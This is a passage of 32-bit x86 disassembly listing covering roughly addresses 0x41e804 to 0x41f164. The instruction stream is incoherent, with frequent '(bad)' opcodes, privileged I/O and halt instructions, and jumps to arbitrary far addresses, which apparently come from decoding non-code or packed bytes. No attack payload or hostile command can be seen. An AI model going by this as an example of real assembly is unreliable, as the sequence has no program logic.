  41e804:	scas   al,BYTE PTR es:[edi]
  41e805:	mov    ds,WORD PTR [eax+ecx*8]
  41e808:	ret    
  41e809:	mov    bl,0x41
  41e80b:	ret    0x268a
  41e80e:	data16 mov al,ds:0x50010cdd
  41e814:	ds call 0x17ac:0x3c32d2b9
  41e81c:	fcomp  QWORD PTR [edx]
  41e81e:	or     eax,0x1a4fac44
  41e823:	inc    edi
  41e824:	mov    ebx,0x8e3cee6a
  41e829:	xchg   ebp,eax
  41e82a:	daa    
  41e82b:	jl     0x41e812
  41e82d:	xchg   DWORD PTR [edi+0x1395fd97],ecx
  41e833:	jmp    0xb4eb:0x86768b90
  41e83a:	ja     0x41e7de
  41e83c:	mov    cl,0x10
  41e83e:	stc    
  41e83f:	je     0x41e8be
  41e841:	inc    esi
  41e842:	push   edi
  41e843:	push   ss
  41e844:	or     eax,edi
  41e846:	jmp    0x41e8bf
  41e848:	sti    
  41e849:	hlt    
  41e84a:	jbe    0x41e801
  41e84c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e84d:	(bad)
  41e850:	stos   DWORD PTR es:[edi],eax
  41e851:	mov    ?,WORD PTR [edi+0x46]
  41e854:	cwde   
  41e855:	sub    BYTE PTR [eiz*1+0xaa7962b],ch
  41e85c:	mov    fs,WORD PTR [eax+0x33]
  41e85f:	mov    esp,0x3d678f8e
  41e864:	mov    ebp,0xa45cefa7
  41e869:	(bad)  
  41e86a:	outs   dx,BYTE PTR ds:[esi]
  41e86b:	add    eax,0x37b82f94
  41e870:	add    bh,dl
  41e872:	es fs mov eax,0x713adbe3
  41e879:	xchg   BYTE PTR [edx],cl
  41e87b:	ins    DWORD PTR es:[edi],dx
  41e87c:	add    BYTE PTR [ecx-0x4d],dh
  41e87f:	dec    ebp
  41e880:	mov    cl,0xa6
  41e882:	out    0xc9,al
  41e884:	out    0x92,eax
  41e886:	imul   ebp,DWORD PTR [eax-0x3bc83cc5],0x90616482
  41e890:	adc    ecx,ebx
  41e892:	inc    eax
  41e893:	sbb    BYTE PTR [edi-0x5f],cl
  41e896:	add    BYTE PTR [ebp+0x4f],bh
  41e899:	scas   al,BYTE PTR es:[edi]
  41e89a:	jmp    0xb27a9efb
  41e89f:	sbb    eax,0x6237e729
  41e8a4:	push   0xffffffca
  41e8a6:	mov    ecx,fs
  41e8a8:	(bad)  
  41e8a9:	dec    edi
  41e8aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e8ab:	test   DWORD PTR [edx],eax
  41e8ad:	enter  0x4b51,0x68
  41e8b1:	dec    esi
  41e8b2:	(bad)  [ebp+0x27cc81e9]
  41e8b8:	dec    ebp
  41e8b9:	add    eax,DWORD PTR [ebx+0x483f83bd]
  41e8bf:	sar    ebp,1
  41e8c1:	and    DWORD PTR [esi+0x4543a79d],esp
  41e8c7:	pop    ebp
  41e8c8:	adc    DWORD PTR [eax+0x4daddcc2],ebp
  41e8ce:	mov    ebx,DWORD PTR [ecx+0x2]
  41e8d1:	out    dx,eax
  41e8d2:	test   DWORD PTR [ebx-0x343cd21b],ecx
  41e8d8:	(bad)
  41e8dd:	fisubr DWORD PTR [esi]
  41e8df:	sbb    al,0x17
  41e8e1:	(bad)  
  41e8e2:	and    ebp,ebp
  41e8e4:	rcr    BYTE PTR [ebp+0x45b1312b],cl
  41e8ea:	inc    eax
  41e8eb:	xor    bl,BYTE PTR [ebx-0x27379d31]
  41e8f1:	ror    BYTE PTR [edi-0x23800276],1
  41e8f7:	adc    eax,0x1fc1f18f
  41e8fc:	mov    ah,0xcf
  41e8fe:	mov    eax,0x89bf793b
  41e903:	push   0xffffffb8
  41e905:	mov    ecx,0x6c54ca04
  41e90a:	ja     0x41e8fb
  41e90c:	icebp  
  41e90d:	inc    ebp
  41e90e:	cld    
  41e90f:	mov    ch,0x8e
  41e911:	pop    esp
  41e912:	gs or  ax,0x56e3
  41e917:	sub    DWORD PTR [edi+0x16],esi
  41e91a:	fdivr  DWORD PTR [edx]
  41e91c:	push   ecx
  41e91d:	jle    0x41e967
  41e91f:	in     al,dx
  41e920:	bound  edi,QWORD PTR [ecx-0x209025b0]
  41e926:	int    0xb4
  41e928:	rcr    DWORD PTR [edi-0x5f3429f7],0xde
  41e92f:	je     0x41e99e
  41e931:	ins    BYTE PTR es:[edi],dx
  41e932:	lock ds push cs
  41e935:	mov    ecx,0xe8bf429d
  41e93a:	icebp  
  41e93b:	mov    esi,0x6dd2e04e
  41e940:	sbb    al,0xad
  41e942:	sbb    edx,ebx
  41e944:	jecxz  0x41e914
  41e946:	jl     0x41e9a9
  41e948:	repz sub BYTE PTR [eax+0x68],bh
  41e94c:	add    ch,dl
  41e94e:	imul   edx,DWORD PTR [eax],0xffffffab
  41e951:	arpl   WORD PTR [esi],bp
  41e953:	push   0xb9723ca4
  41e958:	xor    eax,0x663392a4
  41e95d:	push   0x30
  41e95f:	scas   al,BYTE PTR es:[edi]
  41e960:	int    0x2
  41e962:	loope  0x41e9c3
  41e964:	cmp    al,BYTE PTR [eax+0x63b59ae8]
  41e96a:	push   ebp
  41e96b:	call   DWORD PTR [edi-0x79]
  41e96e:	ds imul ebx,ecx,0xffffff8a
  41e972:	pop    eax
  41e973:	jle    0x41e9c7
  41e975:	lds    ecx,FWORD PTR [ebx+0x70]
  41e978:	and    eax,0x7d71d0ea
  41e97d:	mov    eax,ds:0x97dbbc02
  41e982:	push   ss
  41e983:	popf   
  41e984:	pop    esi
  41e985:	in     al,dx
  41e986:	add    edx,edx
  41e988:	test   BYTE PTR [eax+0x5e7f7aaf],0x6
  41e98f:	cld    
  41e990:	out    dx,eax
  41e991:	mov    dh,ch
  41e993:	dec    esi
  41e994:	ret    0xb17c
  41e997:	es fs aas 
  41e99a:	dec    ecx
  41e99b:	or     eax,0xc49870a1
  41e9a0:	int3   
  41e9a1:	cli    
  41e9a2:	jnp    0x41e95f
  41e9a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e9a5:	xchg   ebx,eax
  41e9a6:	add    dl,BYTE PTR [edx]
  41e9a8:	or     BYTE PTR [ebp-0x28201f02],ch
  41e9ae:	jmp    0x41e9f0
  41e9b0:	xchg   ebp,eax
  41e9b1:	mov    al,ds:0x637b5be5
  41e9b6:	cmp    DWORD PTR [ecx+0x18],ecx
  41e9b9:	xchg   edi,eax
  41e9ba:	dec    ebx
  41e9bb:	dec    ebp
  41e9bc:	sti    
  41e9bd:	cmp    ebp,edx
  41e9bf:	mov    dh,bh
  41e9c1:	pop    ecx
  41e9c2:	arpl   WORD PTR [edx-0x288c737d],si
  41e9c8:	dec    edx
  41e9c9:	adc    BYTE PTR [esi+0x33],0xe2
  41e9cd:	test   BYTE PTR [ecx-0x6a],cl
  41e9d0:	inc    ebx
  41e9d1:	test   DWORD PTR [ecx+ebp*8+0x79c00b73],0xdd4ba7f2
  41e9dc:	xor    esi,ebp
  41e9de:	cmp    esi,esp
  41e9e0:	aam    0xf3
  41e9e2:	jp     0x41e9d1
  41e9e4:	data16 jne 0x41e9eb
  41e9e7:	sahf   
  41e9e8:	sub    ah,BYTE PTR [edx+0x12]
  41e9eb:	stc    
  41e9ec:	pop    ds
  41e9ed:	ror    DWORD PTR [esi+eiz*1-0x5cc180b5],cl
  41e9f4:	and    al,0xb7
  41e9f6:	(bad)  
  41e9f7:	repnz xchg ebx,eax
  41e9f9:	dec    edx
  41e9fa:	add    DWORD PTR [esi+0x54c0beb6],0xffffff8b
  41ea01:	cdq    
  41ea02:	test   al,0x49
  41ea04:	or     DWORD PTR [esi],ebp
  41ea06:	xchg   edx,eax
  41ea07:	pusha  
  41ea08:	js     0x41ea1f
  41ea0a:	ficomp WORD PTR [ebx]
  41ea0c:	loopne 0x41ea3d
  41ea0e:	mov    ds:0xd47ebab2,al
  41ea13:	sub    esi,DWORD PTR [eax+0xcaa3cbf]
  41ea19:	sbb    dl,BYTE PTR [edx-0x4092e068]
  41ea1f:	imul   edx,DWORD PTR [ebp-0x4abaa01e],0x4f
  41ea26:	ret    
  41ea27:	and    BYTE PTR [edi],0xdc
  41ea2a:	lods   eax,DWORD PTR ds:[esi]
  41ea2b:	xchg   ecx,eax
  41ea2c:	pop    ecx
  41ea2d:	dec    DWORD PTR [ebp+0xe]
  41ea30:	lods   al,BYTE PTR ds:[esi]
  41ea31:	scas   al,BYTE PTR es:[edi]
  41ea32:	out    0x22,al
  41ea34:	jmp    0xe941:0x93967e27
  41ea3b:	in     al,dx
  41ea3c:	pusha  
  41ea3d:	pop    edx
  41ea3e:	mov    dh,0xf3
  41ea40:	fbld   TBYTE PTR [edx+0x2c267bc1]
  41ea46:	cmp    al,0xce
  41ea48:	pop    ds
  41ea49:	mov    ebx,0x8d5b56a3
  41ea4e:	push   0xffffff97
  41ea50:	mov    ecx,0xda20b6df
  41ea55:	(bad)  
  41ea56:	mov    ch,0x64
  41ea58:	fxch   st(4)
  41ea5a:	push   0xffffffae
  41ea5c:	(bad)  
  41ea5d:	retf   0x128e
  41ea60:	hlt    
  41ea61:	jmp    0xcfef37f1
  41ea66:	test   al,0x7a
  41ea68:	int3   
  41ea69:	retf   
  41ea6a:	std    
  41ea6b:	stos   BYTE PTR es:[edi],al
  41ea6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea6d:	fcmovnb st,st(1)
  41ea6f:	pop    eax
  41ea70:	(bad)  
  41ea71:	aaa    
  41ea72:	lods   eax,DWORD PTR ds:[esi]
  41ea73:	xchg   ecx,eax
  41ea74:	test   BYTE PTR [esi+eiz*8+0x2],cl
  41ea78:	mov    esp,0x3b90b6b8
  41ea7d:	retf   
  41ea7e:	mov    WORD PTR [edx],fs
  41ea80:	lods   al,BYTE PTR ds:[esi]
  41ea81:	adc    al,0xed
  41ea83:	inc    ebx
  41ea84:	fs inc eax
  41ea86:	outs   dx,DWORD PTR ds:[esi]
  41ea87:	sub    DWORD PTR [ebx],0xffffffa4
  41ea8a:	inc    edx
  41ea8b:	(bad)  
	...
  41ec65:	and    BYTE PTR [edi-0x200729d],bl
  41ec6b:	out    dx,al
  41ec6c:	mov    edi,0x4100ab8e
  41ec71:	mov    esi,0x1b6f111b
  41ec76:	inc    ebp
  41ec77:	add    DWORD PTR [eax],eax
  41ec79:	and    BYTE PTR [edi],al
  41ec7b:	add    BYTE PTR [eax],al
  41ec7d:	ret    0x45ce
  41ec80:	pop    ss
  41ec81:	pop    edi
  41ec82:	call   0xb85de7e1
  41ec87:	cmp    edi,DWORD PTR [ebp+ebx*8-0x34]
  41ec8b:	xor    dh,BYTE PTR [ecx-0x2b]
  41ec8e:	or     DWORD PTR [edx+0x49090bf1],esi
  41ec94:	xchg   DWORD PTR [edx-0x796479d5],ecx
  41ec9a:	sbb    BYTE PTR [ecx-0xff2f68a],dl
  41eca0:	pop    ecx
  41eca1:	lods   eax,DWORD PTR ds:[esi]
  41eca2:	repz stc 
  41eca4:	xlat   BYTE PTR ds:[ebx]
  41eca5:	sar    BYTE PTR [edi],cl
  41eca7:	retf   
  41eca8:	xor    edi,DWORD PTR [edx+0x1a52a2cb]
  41ecae:	ja     0x41ecaa
  41ecb0:	mov    edi,0xef592d0c
  41ecb5:	or     eax,0x44035a76
  41ecba:	and    eax,ecx
  41ecbc:	(bad)  {k1}{z}
  41ecc1:	repz fcmove st,st(3)
  41ecc4:	jbe    0x41ec9b
  41ecc6:	dec    ebp
  41ecc7:	stos   BYTE PTR es:[edi],al
  41ecc8:	mov    BYTE PTR [bp-0x69],ch
  41eccc:	sti    
  41eccd:	mov    BYTE PTR [esi-0x3a3e69e2],dl
  41ecd3:	sbb    eax,0x2770b335
  41ecd8:	mov    dl,0xb8
  41ecda:	jns    0x41ed2d
  41ecdc:	in     eax,dx
  41ecdd:	mov    al,ds:0x1c37dd41
  41ece2:	ins    DWORD PTR es:[edi],dx
  41ece3:	adc    DWORD PTR [edx],0xffffffe6
  41ece6:	lea    ebp,[ebx]
  41ece8:	clc    
  41ece9:	mov    edx,0x795d61f7
  41ecee:	xchg   ebx,eax
  41ecef:	retf   
  41ecf0:	jae    0x41ed1d
  41ecf2:	neg    esp
  41ecf4:	frstor cs:[ecx]
  41ecf7:	loop   0x41ed75
  41ecf9:	mov    dh,BYTE PTR [esi+0x37]
  41ecfc:	outs   dx,BYTE PTR ds:[esi]
  41ecfd:	mov    ebx,0xa991f2b0
  41ed02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed03:	out    0x1b,eax
  41ed05:	(bad)  gs:[ebx]
  41ed08:	ss imul esi,ebx,0x2ede9eb
  41ed0f:	xchg   ebp,eax
  41ed10:	jbe    0x41eccf
  41ed12:	sahf   
  41ed13:	add    esi,DWORD PTR [edi+ebx*2]
  41ed16:	je     0x41ecd6
  41ed18:	mov    ecx,0xf1e9e550
  41ed1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed1e:	shr    BYTE PTR [eax+0x21],cl
  41ed21:	and    al,0x78
  41ed23:	sub    DWORD PTR cs:[ebp-0x35512a54],esi
  41ed2a:	inc    esp
  41ed2b:	das    
  41ed2c:	xor    al,al
  41ed2e:	jnp    0x41ece3
  41ed30:	sbb    ch,BYTE PTR [ebx-0x4c99ac15]
  41ed36:	(bad)  
  41ed37:	loopne 0x41eda3
  41ed39:	xchg   edx,eax
  41ed3a:	lahf   
  41ed3b:	and    BYTE PTR [ecx+0x31],ch
  41ed3e:	xchg   ecx,eax
  41ed3f:	push   ebp
  41ed40:	add    esp,ebx
  41ed42:	push   ss
  41ed43:	bound  ebx,QWORD PTR [ebx+edi*2]
  41ed46:	test   BYTE PTR [edi],dl
  41ed48:	clc    
  41ed49:	xlat   BYTE PTR ds:[ebx]
  41ed4a:	call   0x23cab896
  41ed4f:	rcr    BYTE PTR [edx+0x607a124],1
  41ed55:	iret   
  41ed56:	loopne 0x41eced
  41ed58:	and    DWORD PTR [edi+0x56f70b61],ebx
  41ed5e:	add    BYTE PTR [edx],0x4d
  41ed61:	sbb    edi,ebx
  41ed63:	scas   eax,DWORD PTR es:[edi]
  41ed64:	pop    esi
  41ed65:	scas   eax,DWORD PTR es:[edi]
  41ed66:	leave  
  41ed67:	inc    ebp
  41ed68:	repz xor ecx,DWORD PTR ds:0x4bb0872
  41ed6f:	jno    0x41edc8
  41ed71:	mov    BYTE PTR [eax-0x52],bl
  41ed74:	sbb    al,0xfc
  41ed76:	xor    eax,0x4f9fdf49
  41ed7b:	lods   eax,DWORD PTR ds:[esi]
  41ed7c:	pop    esi
  41ed7d:	pop    esp
  41ed7e:	test   DWORD PTR [eax],edx
  41ed80:	xor    eax,0x83ee6883
  41ed85:	sbb    ebp,edx
  41ed87:	fwait
  41ed88:	lea    esi,[esi]
  41ed8a:	dec    edx
  41ed8b:	lea    ebp,[ecx-0x3f1ace25]
  41ed91:	mov    esi,0x5acfdcd2
  41ed96:	call   0x3797:0xaf8ac65e
  41ed9d:	sub    DWORD PTR [ebx],ebx
  41ed9f:	cld    
  41eda0:	jno    0x41edf8
  41eda2:	jge    0x41ed96
  41eda4:	ficom  WORD PTR gs:[edx-0x6334b1cd]
  41edab:	sbb    dh,ah
  41edad:	int    0x73
  41edaf:	mov    cl,0x2c
  41edb1:	jl     0x41ed59
  41edb3:	pop    edi
  41edb4:	mov    ebx,0x2313c96a
  41edb9:	pop    edi
  41edba:	jg     0x41ed42
  41edbc:	jnp    0x41edf2
  41edbe:	sahf   
  41edbf:	push   ebp
  41edc0:	lods   eax,DWORD PTR ds:[esi]
  41edc1:	cli    
  41edc2:	cmp    al,BYTE PTR [esi-0x35a5d212]
  41edc8:	mov    DWORD PTR ds:[esi+0x1df5c98a],0xe3388a2d
  41edd3:	aaa    
  41edd4:	mov    dh,0x50
  41edd6:	data16 fldcw WORD PTR [eax+edx*8-0x45]
  41eddb:	ins    BYTE PTR es:[edi],dx
  41eddc:	adc    eax,0x29a203a1
  41ede1:	add    al,0xbe
  41ede3:	adc    al,bh
  41ede5:	sub    eax,0x9181bce3
  41edea:	sahf   
  41edeb:	push   0x14c084e9
  41edf0:	jg     0x41ed7f
  41edf2:	scas   eax,DWORD PTR es:[edi]
  41edf3:	mov    bh,0xe
  41edf5:	mov    WORD PTR [ecx],ds
  41edf7:	popf   
  41edf8:	sbb    ah,BYTE PTR [ebp+0x3d1a25d7]
  41edfe:	sbb    al,0x88
  41ee00:	mov    bl,dl
  41ee02:	cmp    eax,0xd6408e3c
  41ee07:	inc    ecx
  41ee08:	dec    edi
  41ee09:	rcr    BYTE PTR [ebp+0x45b74577],cl
  41ee0f:	jp     0x41edfa
  41ee11:	mov    ch,0x5b
  41ee13:	mov    BYTE PTR [esi],ch
  41ee15:	inc    esi
  41ee16:	pop    esi
  41ee17:	nop
  41ee18:	fnstcw WORD PTR [ebp-0x44]
  41ee1b:	call   0xe7bfe213
  41ee20:	js     0x41ee48
  41ee22:	out    dx,eax
  41ee23:	lods   eax,DWORD PTR ds:[esi]
  41ee24:	in     eax,0x5f
  41ee26:	cmp    al,0x49
  41ee28:	(bad)  
  41ee29:	sub    ebx,DWORD PTR [ebp+0x7e]
  41ee2c:	aam    0x9c
  41ee2e:	sar    DWORD PTR [esi],0xe7
  41ee31:	aam    0x3b
  41ee33:	mov    ebp,0xdf4c6493
  41ee38:	std    
  41ee39:	jl     0x41ee3b
  41ee3b:	fisttp DWORD PTR [ecx]
  41ee3d:	fist   WORD PTR [edi]
  41ee3f:	xchg   edi,eax
  41ee40:	jbe    0x41ee24
  41ee42:	xlat   BYTE PTR ds:[ebx]
  41ee43:	cld    
  41ee44:	inc    edx
  41ee45:	mov    eax,ds:0xcda83b45
  41ee4a:	out    0x32,eax
  41ee4c:	jae    0x41ee61
  41ee4e:	and    BYTE PTR [ecx-0x41bf0a8f],bh
  41ee54:	xlat   BYTE PTR ds:[ebx]
  41ee55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee56:	fwait
  41ee57:	mov    ecx,DWORD PTR [edx+eax*8]
  41ee5a:	inc    eax
  41ee5b:	mov    ah,0xfa
  41ee5d:	add    eax,0x798ee87e
  41ee62:	cmp    eax,0xab056670
  41ee67:	jb     0x41ee28
  41ee69:	cmp    edi,DWORD PTR [eax+esi*1-0x1452b935]
  41ee70:	push   0xffffffc9
  41ee72:	loope  0x41ee0e
  41ee74:	adc    eax,0xc1b92edd
  41ee79:	cli    
  41ee7a:	mov    dh,0x5d
  41ee7c:	xor    bh,BYTE PTR [ecx+0x14]
  41ee7f:	push   ss
  41ee80:	mov    dh,0x4
  41ee82:	pop    edi
  41ee83:	inc    edi
  41ee84:	push   esi
  41ee85:	loopne 0x41eed3
  41ee87:	mov    eax,ds:0x5e2befbf
  41ee8c:	inc    esp
  41ee8d:	fcom   DWORD PTR [esi+0xd051393]
  41ee93:	or     ah,bl
  41ee95:	imul   edi,DWORD PTR [esi],0xe79d3f8f
  41ee9b:	arpl   WORD PTR [ecx+0x52],si
  41ee9e:	into   
  41ee9f:	sub    dl,dl
  41eea1:	and    al,0xd
  41eea3:	sbb    DWORD PTR [edi+0x19],edi
  41eea6:	enter  0x70c9,0x7a
  41eeaa:	test   DWORD PTR [edx],ecx
  41eeac:	push   esi
  41eead:	pop    edi
  41eeae:	add    ebp,DWORD PTR [ebx+0x78]
  41eeb1:	mov    DWORD PTR [edx-0x5],edi
  41eeb4:	jmp    0xa684:0x983c9d40
  41eebb:	mov    DWORD PTR [edx-0x7],ecx
  41eebe:	push   esi
  41eebf:	mov    eax,0xc2218705
  41eec4:	mov    eax,0x84aebeeb
  41eec9:	xchg   edi,eax
  41eeca:	dec    ebp
  41eecb:	mul    BYTE PTR [ebp*2+0x5cabfba7]
  41eed2:	pop    ebx
  41eed3:	inc    esi
  41eed4:	pop    esp
  41eed5:	cmp    DWORD PTR [ebx+0x79],esp
  41eed8:	fadd   DWORD PTR [eax-0x9]
  41eedb:	(bad)  
  41eedc:	cs add eax,0xd461293c
  41eee2:	js     0x41ef48
  41eee4:	ret    
  41eee5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eee6:	mov    ebx,0xcc24c37b
  41eeeb:	lods   eax,DWORD PTR ds:[esi]
  41eeec:	xor    al,0x2e
  41eeee:	paddw  mm3,QWORD PTR [edi-0x6c]
  41eef2:	pop    ebx
  41eef3:	jecxz  0x41ef2d
  41eef5:	outs   dx,DWORD PTR ds:[esi]
  41eef6:	test   eax,0xddd578d9
  41eefb:	inc    ebx
  41eefc:	fidivr DWORD PTR ds:0xa5225a36
  41ef02:	rcr    DWORD PTR [ebx+0x1db50dfa],1
  41ef08:	repz mov esp,0x1f0a748
  41ef0e:	jl     0x41eea0
  41ef10:	repnz push 0x49
  41ef13:	xchg   bl,bh
  41ef15:	and    edi,DWORD PTR [eax-0x4cd90639]
  41ef1b:	outs   dx,BYTE PTR ds:[esi]
  41ef1c:	lock shr DWORD PTR [edi+0x6],0x93
  41ef21:	icebp  
  41ef22:	xchg   edi,eax
  41ef23:	(bad)  
  41ef24:	and    ecx,edi
  41ef26:	out    0xbf,eax
  41ef28:	or     DWORD PTR [esi+0x3faf441b],esi
  41ef2e:	mov    dh,0xf
  41ef30:	or     bl,BYTE PTR [eax-0x35fd96a7]
  41ef36:	mov    esi,DWORD PTR [edi]
  41ef38:	xor    BYTE PTR [ecx],ch
  41ef3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef3b:	or     DWORD PTR [esi-0x7f42f305],ebp
  41ef41:	inc    ebx
  41ef42:	adc    al,0x78
  41ef44:	adc    BYTE PTR [ebx-0x71],cl
  41ef47:	sbb    esi,ebp
  41ef49:	stos   DWORD PTR es:[edi],eax
  41ef4a:	inc    ebx
  41ef4b:	ret    
  41ef4c:	mov    cl,0x7f
  41ef4e:	adc    cl,bl
  41ef50:	cs mov eax,0x55ca7f3a
  41ef56:	(bad)  [edi]
  41ef58:	dec    edx
  41ef59:	dec    ebp
  41ef5a:	push   ss
  41ef5b:	sub    dl,al
  41ef5d:	in     eax,dx
  41ef5e:	test   DWORD PTR [ecx-0x80],edx
  41ef61:	mov    eax,ds:0x9b5030d7
  41ef66:	mov    ecx,0x8e123b72
  41ef6b:	loope  0x41efd4
  41ef6d:	push   esp
  41ef6e:	cwde   
  41ef6f:	xor    eax,0xeaa372b
  41ef74:	and    al,0xc7
  41ef76:	cmp    DWORD PTR [edx+0x10],ebp
  41ef79:	xchg   BYTE PTR [esi+esi*1-0x36e2530c],cl
  41ef80:	imul   edi,DWORD PTR [ebx+0x3],0xffffff8e
  41ef84:	out    dx,al
  41ef85:	push   cs
  41ef86:	test   DWORD PTR [ebp+edx*1-0x331c55f6],0xec56b2a5
  41ef91:	jg     0x41efa5
  41ef93:	retf   
  41ef94:	mov    ebp,0xdf2e376a
  41ef99:	fcom   DWORD PTR [ecx]
  41ef9b:	fst    QWORD PTR [eax-0x72a9c832]
  41efa1:	test   DWORD PTR [edi],0xad9833db
  41efa7:	jns    0x41ef8f
  41efa9:	test   al,0x8f
  41efab:	inc    edx
  41efac:	fwait
  41efad:	xchg   dh,dl
  41efaf:	lock leave 
  41efb1:	(bad)  
  41efb2:	xor    al,BYTE PTR [eax-0x225bd291]
  41efb8:	inc    ecx
  41efb9:	push   ds
  41efba:	ins    BYTE PTR es:[edi],dx
  41efbb:	add    al,0xbc
  41efbd:	fst    QWORD PTR [eax-0x41230948]
  41efc3:	data16 cli 
  41efc5:	fsubr  DWORD PTR [edx+0x5df85682]
  41efcb:	mov    ebx,0x6a1456ba
  41efd0:	xlat   BYTE PTR ds:[ebx]
  41efd1:	std    
  41efd2:	push   ebp
  41efd3:	cmp    ch,ch
  41efd5:	and    DWORD PTR [ecx+0x51],ebx
  41efd8:	jmp    DWORD PTR [eax]
  41efda:	sub    ebx,ebx
  41efdc:	mov    ebx,0xf041c9dd
  41efe1:	cdq    
  41efe2:	dec    esp
  41efe3:	sti    
  41efe4:	adc    al,0x91
  41efe6:	mov    edx,edi
  41efe8:	mov    ecx,0x6b794a04
  41efed:	mov    WORD PTR [eax-0x5e],gs
  41eff0:	test   cl,0x8a
  41eff3:	out    dx,al
  41eff4:	or     edi,DWORD PTR [edi+0x756b1eb8]
  41effa:	pop    es
  41effb:	cmp    ebp,DWORD PTR [esi]
  41effd:	or     ah,dl
  41efff:	xchg   edx,eax
  41f000:	pop    ss
  41f001:	arpl   WORD PTR [edx-0x5774c663],si
  41f007:	sbb    al,0x90
  41f009:	sbb    eax,0xfd67f6fa
  41f00e:	stos   BYTE PTR es:[edi],al
  41f00f:	mov    cl,0xa7
  41f011:	popf   
  41f012:	add    cl,BYTE PTR [ebx]
  41f014:	sbb    eax,0xbffecd0f
  41f019:	bound  edx,QWORD PTR [ebp-0x30]
  41f01c:	jl     0x41efe6
  41f01e:	or     al,bh
  41f020:	inc    esi
  41f021:	pop    edx
  41f022:	out    0xe8,al
  41f024:	retf   
  41f025:	sub    eax,0x8636bc25
  41f02a:	xchg   ecx,eax
  41f02b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f02c:	daa    
  41f02d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f02e:	repnz mov cs,WORD PTR ds:0x9d47758c
  41f035:	jae    0x41eff6
  41f037:	pop    esi
  41f038:	mov    esi,0xa55b59c8
  41f03d:	adc    ebp,DWORD PTR [esi-0x315fc871]
  41f043:	retf   
  41f044:	retf   
  41f045:	mov    bh,0xa6
  41f047:	pusha  
  41f048:	leave  
  41f049:	out    dx,eax
  41f04a:	fcom   QWORD PTR [esi]
  41f04c:	sahf   
  41f04d:	jp     0x41eff6
  41f04f:	aaa    
  41f050:	sbb    BYTE PTR [edi],ch
  41f052:	inc    esi
  41f053:	outs   dx,BYTE PTR ds:[esi]
  41f054:	jge    0x41f0d5
  41f056:	stos   DWORD PTR es:[edi],eax
  41f057:	pop    edi
  41f058:	inc    edx
  41f059:	or     ebx,eax
  41f05b:	xor    dl,0xf1
  41f05e:	jmp    0x103c:0x3b6f43ad
  41f065:	(bad)  
  41f066:	sbb    eax,0xbbb31886
  41f06b:	adc    ebp,esp
  41f06d:	fimul  WORD PTR [eax-0x2470b2a6]
  41f073:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f074:	mov    ch,0x62
  41f076:	jno    0x41f03f
  41f078:	fdivrp st(7),st
  41f07a:	jge    0x41f04b
  41f07c:	xor    eax,0x9cf8574c
  41f081:	mov    edi,0xa87adc2b
  41f086:	push   ebp
  41f087:	mov    ?,esi
  41f089:	jmp    0x4761:0x8c648a5e
  41f090:	mov    edi,0x83c0b22
  41f095:	cs push eax
  41f097:	add    BYTE PTR [ecx-0xe],cl
  41f09a:	dec    eax
  41f09b:	loop   0x41f0db
  41f09d:	inc    ecx
  41f09e:	cld    
  41f09f:	fld    TBYTE PTR [esp+esi*2+0x19968b49]
  41f0a6:	popa   
  41f0a7:	repz ret 0x7eba
  41f0ab:	scas   al,BYTE PTR es:[edi]
  41f0ac:	stos   BYTE PTR es:[edi],al
  41f0ad:	xor    bh,BYTE PTR [ebp-0x3e6af91]
  41f0b3:	retf   
  41f0b4:	stc    
  41f0b5:	pop    ss
  41f0b6:	addr16 pop eax
  41f0b8:	sub    BYTE PTR [edi-0x6a743628],dl
  41f0be:	addr16 pop ebp
  41f0c0:	and    eax,0xa6b932ad
  41f0c5:	xlat   BYTE PTR ds:[ebx]
  41f0c6:	push   esp
  41f0c7:	std    
  41f0c8:	cmp    DWORD PTR [ecx+ebx*2-0x5c],0xe6a879a1
  41f0d0:	push   es
  41f0d1:	push   ebp
  41f0d2:	test   DWORD PTR [eax-0x5c],eax
  41f0d5:	(bad)  
  41f0d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0d7:	out    0x7f,al
  41f0d9:	pop    esp
  41f0da:	imul   esp,DWORD PTR [edi+ebp*8+0x2b],0x6460eb23
  41f0e2:	mov    ebp,DWORD PTR [ecx+esi*4]
  41f0e5:	cld    
  41f0e6:	loope  0x41f108
  41f0e8:	fistp  WORD PTR [ecx-0x7b]
  41f0eb:	add    eax,0x754b05c3
  41f0f0:	dec    eax
  41f0f1:	xchg   ecx,eax
  41f0f2:	xor    DWORD PTR [eax+eiz*4],ecx
  41f0f5:	and    al,0x15
  41f0f7:	mov    bl,0x7e
  41f0f9:	gs xchg ebp,eax
  41f0fb:	adc    DWORD PTR [ebp+0x6b],ebp
  41f0fe:	add    DWORD PTR [edi+0x6],esp
  41f101:	nop
  41f102:	add    al,0xd0
  41f104:	and    dl,dh
  41f106:	imul   esp,DWORD PTR [eax-0x5c35bf29],0xffffffec
  41f10d:	cmp    eax,0x65f1fc75
  41f112:	sub    DWORD PTR [ebx+esi*1+0x6601013b],esi
  41f119:	sub    edi,edi
  41f11b:	les    edx,FWORD PTR [eax+edi*4-0x1b57102e]
  41f122:	test   al,0x69
  41f124:	rol    BYTE PTR [esi+0x35dec6d5],1
  41f12a:	mov    esp,ebx
  41f12c:	(bad)  
  41f12d:	ficom  WORD PTR [ecx-0x5a]
  41f130:	inc    edx
  41f131:	xor    eax,0x4ce016ad
  41f136:	test   BYTE PTR [eax+ebp*4+0x63ccfb55],0x4b
  41f13e:	popf   
  41f13f:	call   0xa602:0xa9a89bc3
  41f146:	jne    0x41f16b
  41f148:	xor    cl,BYTE PTR [edi]
  41f14a:	xor    bl,dh
  41f14c:	push   0x635fda8a
  41f151:	mov    WORD PTR [eax+0x243724c],gs
  41f157:	xchg   edx,eax
  41f158:	sub    BYTE PTR [ecx+0x166e1031],dl
  41f15e:	leave  
  41f15f:	sbb    al,0x9c
  41f161:	mov    ah,0x3a
  41f163:	pop    eax
  41f164:	enter  0x979d,0xa8
